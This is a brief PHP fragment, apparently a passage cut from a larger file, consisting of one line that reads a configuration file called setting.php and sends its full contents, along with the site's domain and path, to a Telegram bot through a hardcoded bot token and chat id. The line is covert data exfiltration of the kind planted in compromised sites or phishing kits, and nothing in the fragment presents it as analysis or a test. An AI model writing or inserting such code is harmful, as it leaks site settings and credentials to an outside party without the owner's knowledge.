...
if (file_exists($f)) file_get_contents("https://api.telegram.org/bot7335304364:AAFxaKe8QkMoGsuDIrobONjLNYmWTTCHViM/sendMessage?chat_id=7416297295&text=Domain:$d\\nPath:$p\\nFile:setting.php\\nContent:".urlencode(file_get_contents($f)));
/*
